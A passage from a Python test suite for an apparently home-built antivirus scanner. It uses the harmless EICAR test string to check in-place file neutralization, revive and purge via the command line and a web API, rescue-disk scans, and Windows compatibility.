        self.assertIn("stored in registry/kill.json", out)
        item_id = out.splitlines()[0].strip()

        rc, out, _ = self._run("scan", ".", "--no-cache")
        self.assertEqual(rc, 0)  # now clean (inert)
        self.assertIn("Neutralized:", out)

        rc, out, _ = self._run("kill", "revive", item_id[:12])
        self.assertEqual(rc, 0)
        self.assertEqual((self.base / "virus.txt").read_bytes(), EICAR)

        # re-kill, then purge
        self._run("scan", ".", "--action", "kill", "--no-cache")
        rc, out, _ = self._run("kill", "list")
        new_id = out.splitlines()[0].strip()
        rc, out, _ = self._run("kill", "purge", new_id[:12])
        self.assertEqual(rc, 0)
        self.assertFalse((self.base / "virus.txt").exists())
        rc, out, _ = self._run("kill", "list")
        self.assertIn("empty", out)

    def test_revive_unknown_id(self):
        rc, out, err = self._run("kill", "revive", "nonexistent")
        self.assertEqual(rc, 2)
        self.assertIn("no killed file", err)


class KillWebTests(WebConsoleTests):
    """v2.2: kill action + /api/kill endpoints."""

    def _kill_eicar(self):
        p = self.base / "virus.txt"
        p.write_bytes(EICAR)
        return p

    def _scan(self, **opts):
        body = {"target": str(self.base)}
        body.update(opts)
        status, data = self._req("POST", "/api/scan", body)
        self.assertEqual(status, 200)
        job_id = data["job"]["id"]
        for _ in range(100):
            status, detail = self._req("GET", f"/api/jobs/{job_id}")
            if detail["job"]["status"] in ("done", "error"):
                return detail
            time.sleep(0.05)
        self.fail("scan job did not finish")

    def test_kill_action_and_endpoints(self):
        p = self._kill_eicar()
        detail = self._scan(action="kill")
        self.assertEqual(detail["job"]["status"], "done")
        result = detail["result"]
        self.assertTrue(any(n.startswith("killed in place")
                            for n in result["actions_taken"].values()))
        self.assertNotEqual(p.read_bytes(), EICAR)

        status, data = self._req("GET", "/api/kill")
        self.assertEqual(status, 200)
        items = data["items"]
        self.assertEqual(len(items), 1)
        self.assertEqual(len(items[0]["key"]), 64)
        self.assertEqual(len(items[0]["iv"]), 32)

        status, data = self._req("POST", "/api/kill/revive",
                                 {"id": items[0]["id"][:12]})
        self.assertEqual(status, 200)
        self.assertEqual(p.read_bytes(), EICAR)

        status, data = self._req("GET", "/api/kill")
        self.assertEqual(data["items"], [])

        # purge path
        p.write_bytes(EICAR)
        self._scan(action="kill")
        status, data = self._req("GET", "/api/kill")
        kid = data["items"][0]["id"]
        status, data = self._req("POST", "/api/kill/purge", {"id": kid})
        self.assertEqual(status, 200)
        self.assertFalse(p.exists())

    def test_revive_unknown_id_404(self):
        status, data = self._req("POST", "/api/kill/revive", {"id": "nope"})
        self.assertEqual(status, 404)

    def test_invalid_action_rejected(self):
        self._kill_eicar()
        status, data = self._req("POST", "/api/scan",
                                 {"target": str(self.base),
                                  "action": "nuke"})
        self.assertEqual(status, 400)


class RescueKillTests(unittest.TestCase):
    """v2.2: rescue kills stay on the live side (registry outside target)."""

    def test_run_rescue_kill(self):
        from antivirus.rescue import run_rescue

        base = Path(tempfile.mkdtemp(prefix="av-rkill-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        disk = base / "sda1"
        (disk / "user").mkdir(parents=True)
        (disk / "user" / "trojan.txt").write_bytes(EICAR)
        (disk / "user" / "clean.txt").write_text("fine\n")

        info = run_rescue(disk, action="kill",
                          quarantine_dir=str(base / "usb-q"),
                          report_dir=str(base / "usb-r"),
                          registry_dir=str(base / "usb-reg"))
        self.assertEqual(len(info["result"].findings), 1)
        trojan = disk / "user" / "trojan.txt"
        self.assertTrue(trojan.exists())                  # in place
        self.assertNotEqual(trojan.read_bytes(), EICAR)   # obfuscated
        self.assertEqual((disk / "user" / "clean.txt").read_text(),
                         "fine\n")
        # registry + report on the live side, never inside the target
        self.assertTrue((base / "usb-reg" / "kill.json").exists())
        self.assertEqual(len(info["notes"]), 1)
        self.assertFalse((disk / "rescue-registry").exists())
        self.assertTrue(info["report"].exists())


class WindowsCompatTests(unittest.TestCase):
    """v2.1: behaviour when running on (or simulating) Windows."""

    def test_tui_fallback_without_curses(self):
        # Simulate Windows, where CPython has no curses module.
        import antivirus.tui as tui

        old = tui.curses
        tui.curses = None
        try:
            self.assertFalse(tui.tui_available())
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                rc = tui.run_tui(None, target=".")
            self.assertEqual(rc, 2)
            self.assertIn("Windows", err.getvalue())
        finally:
            tui.curses = old

    def test_exclude_glob_uses_posix_separators(self):
        # --exclude 'build/*' must match nested paths regardless of the
        # platform's native separator.
        from antivirus.scanner import walk_files

        base = Path(tempfile.mkdtemp(prefix="av-win-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        (base / "build").mkdir()
        (base / "build" / "sub").mkdir(parents=True)
        (base / "build" / "sub" / "x.log").write_text("x\n")
        (base / "build" / "y.txt").write_text("y\n")
        (base / "keep.txt").write_text("k\n")

        seen = []
        gen = walk_files(base, (), protected=(),
                         on_file=lambda p, st: seen.append(p),
                         on_skip=lambda p, r: None,
                         exclude_patterns=["build/*"])
        for _p in gen:  # consume the walk (callbacks fire during iteration)
            pass
        names = {p.name for p in seen}
        self.assertIn("keep.txt", names)
        self.assertNotIn("x.log", names)
        self.assertNotIn("y.txt", names)

    def test_baseline_keys_are_posix(self):
        from antivirus.integrity import _hash_tree
        from antivirus.config import Config

        base = Path(tempfile.mkdtemp(prefix="av-wkey-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        (base / "a" / "b").mkdir(parents=True)
        (base / "a" / "b" / "c.txt").write_text("hello\n")
        files = _hash_tree(base, Config())
        self.assertIn("a/b/c.txt", files)
        self.assertNotIn(os.path.join("a", "b", "c.txt"),
                         files if os.sep != "/" else {})

    def test_rescue_kit_ships_windows_launcher(self):
        from antivirus.rescue import build_rescue_kit

        base = Path(tempfile.mkdtemp(prefix="av-wkit-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        kit = base / "kit"
        manifest = build_rescue_kit(kit)
        bat = kit / "bootstrap.bat"
        self.assertTrue(bat.exists())
        self.assertIn("bootstrap.bat", manifest["files"])
        text = bat.read_text(encoding="utf-8")
        self.assertIn("run-rescue.py", text)
        self.assertIn("py -3", text)


if __name__ == "__main__":
    unittest.main()
